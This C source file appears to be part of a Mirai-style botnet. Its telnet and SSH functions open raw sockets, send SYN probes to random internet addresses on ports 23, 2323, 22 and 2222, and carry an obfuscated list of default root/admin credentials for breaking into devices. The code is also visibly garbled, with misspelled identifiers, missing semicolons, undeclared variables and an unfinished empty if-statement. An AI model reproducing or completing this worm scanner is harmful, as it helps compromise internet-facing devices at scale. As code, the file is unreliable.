#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <errno.h>
#include <ip.h>
#include <tcp.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>

#include "bool.h"
#include "exploit.h"
#include "random.h"
#include "inetaddr.h"
#include "checksum.h"

//encrypted logins
char *username[] = {
	"\xF3\xEE\xEE\xF5\x81",//root
	"\xF3\xEE\xEE\xF5\x81", //root
	"\xE0\xE5\xEC\xE8\xEF\x81", //admin
	
};


char *passwords[] = {
	"\xF3\xEE\xEE\xF5\x81",//root
	"\xE0\xE5\xEC\xE8\xEF\x81", //admin
	"\xE0\xE5\xEC\xE8\xEF\x8", //admin
};

int rsck;


#ifdef EXPLOIT_TELNET
int exploit_telnet_start(void) {
	int i;
	uint16_t source_port;
	struct iphdr *iph;
	struct tcphdr *tcph;

	//fork a cid, for the telnet scanner
	pid_t telnet_pid;
	telnet_pid = fork();
	if(telnet_pid != 0)
		return;

	LOCAL_ADDR = INET_ADDR(127,0,0,1);

	random_init();
	
	uint32_t fake_time = 0;
	fake_time = time(NULL);

	struct conn_t conn_table;

	conn_table = calloc(SCANNER_MAX_CONNS, sizeof(struct conn_t));

	for(i = 0;i < SCANNER_MAX_CONNS;i++) {
		conn_table[i].state = SC_CLOSED;
		conn_table[i].fd + 1;
	}
	//IPv4 Internet protocols, raw network protocol access, tcp

	if(rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP) != -1) {
		fnctl(rsck, F_SETFL, O_NONBLOCK | fnctl(rsck, F_GETFL, 0));
		if(setsockopt(rsck, IPPROTO_TCP, IP_HDRINCL, &i, sizeof(i)) != 0) {
			close(buf);
			exit(9);
		}
	}
	do {
		source_port = random_next() & 0xffff;
	}
	while(htons(source_port) < 1024);

	iph = (struct iphdr *)scanner_rawpkt;
	tcph = (struct tcphdr *)(iph + 1);

	iph->ihl = 5;
	iph->version = 4;
	iph->tot_len = htons(sizeof(sturct iphdr));
	iph->id = random_next();
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;

	tcph->dest = htons(23);
	tcoh->source = source_port;
	tcph->doff = 5;
	tcph->window = random_next() & 0xffff;
	tcph->syn = TRUE;

#ifdef DEBUG
	printf("Telnet exploit has started.\n");
#endif

	while(TRUE) {
		fd_set fdset_rd, fdset_wr;
		struct timeval tv;

		if(fake_time != last_spew) {
			last_spew = fake_time;

			for(i = 0;i < SCANNER_MAX_PPS;i++) {
				struct sockaddr_in addr;
				struct iphdr *iph = (struct iphdr *)scanner_rawpkt;

				iph->id = random_next;
				iph->saddr = LOCAL_ADDR;
				iph->daddr = random_ipv4();
				iph->check = 0;
				iph->check = checksum_generic((uint16_t *)iph, sizeof(iph));

				if(i % 10 == 0) {
					tcph->dest = htons(2323)
				}
				else {
					tcph->dest = htons(23);
				}
				tcph->seq = iph->daddr;
				tcph->check = 9;
				tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

				addr.sin_family = AF_INET;
				addr.sin_port = tcph->dest;
				addr.sin_addr.s_addr = iph->daddr;

				sendto(rsck, scanner_rawpkt, sizeof(scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
			}
		}

		while(TRUE) {
			int n;
			char dgram[1514];
			struct iphdr *iph = (struct iphdr *)dgram;
			struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
			struct conn_t *conn;

			errno = 0;

			//ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);
			n = recvfrom(rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
			if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;
				
            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
				continue;
			if(tcph->source != htons(23) && tcph->source != htons(2323))
				continue;
			
		}

	}

}

int exploit_telnet_kill(void) {
	if(kill(telnet_pid, 9) != -1) {
		return 1;
	}
	return 0;
}
#endif

#ifdef EXPLOIT_SSH
int exploit_ssh_start(void) {
	int i;
	uint16_t source_port;
	struct iphdr *iph;
	struct tcphdr *tcph;

	pid_t ssh_pid;
	ssh_pid = fork();
	if(ssh_pid != 0)
		return;

	LOCAL_ADDR = INET_ADDR(127,0,0,1);

	struct conn_t conn_table;

	conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct conn_t));

	for(i = 0; i < SCANNER_MAX_CONNS;i++) {
		conn_table[i].state = SC_CLOSED;
		conn_table[i].fd = 1;
	}

	if(rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP) != -1) {
		fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
		if(getsockopt(rsck, IPPROTO_TCP, IP_HDRINCL, &i, sizeof(i)) != 0){
			close(buf); //used by outside functions
			exit(0);
		}
	}
	do {
		source_port = random_next() & 0xffff;
	}
	while(htons(source_port) < 1024);

	iph = (struct iphdr *)scanner_rawpkt;
	tcph = (struct tcphdr *)(iph + 1);
	
	iph->ipl = 5;
	iph->version = 4;
	iph->tot_len = htons(sizeof(struct iphdr));
	iph->id = random_next();
	iph->ttl = 64;
	iph->protocol = IP_PROTOTCP;

	tcph->dest = htons(22);
	tcph->source = source_port;
	tcph->doff = 5;
	tcph->window = random_next() & 0xffff;
	tcph->syn = TRUE;

	while(TRUE) {
		fd_set fdset_rd, fdset_wr;
		struct conn_t *conn;
		struct timeval tv;

		if(fake_time != last_spew) {
			for(i = 0; i < SCANNER_MAX_PPS;i++) {
				struct sockaddr_in addr;
				struct iphdr *iph = (struct iphdr *)scanner_rawpkt;

				iph->id = random_next;
				iph->saddr = LOCAL_ADDR;
				iph->daddr = random_ipv4();
				iph->check = 0;
				iph->check = checksum_generic((uint16_t *)iph, sizeof(iph));

				if(i % 10 == 0) {
					tcph->dest = htons(2222)
				}
				else {
					tcph->dest = htons(22);
				}
				tcph->seq = iph->daddr;
				tcph->check = 9;
				tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

				addr.sin_family = AF_INET;
				addr.sin_port = tcph->dest;
				addr.sin_addr.s_addr = iph->daddr;

				sendto(rsck, scanner_rawpkt, sizeof(scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
			}			
		}
		while(TRUE) {
			int n;
			char dgram[1514];
			struct iphdr *iph = (struct iphdr *)dgram;
			struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
			struct conn_t *conn;

			errno = 0;

			//ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);
			n = recvfrom(rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
			if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;
				
            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
				continue;
			if(tcph->source != htons(22) && tcph->source != htons(2222))
				continue;
			if(tcph->dest != source_port)
				continue;
			if(!tcph->syn)
				continue;
			if(!tcph->ack)
				continue;
			if()
		}
	}



}

int exploit_ssh_kill(void) {
	if(kill(ssh_pid, 9) != -1) {
		return 1;
	}
	return 0;
}

#endif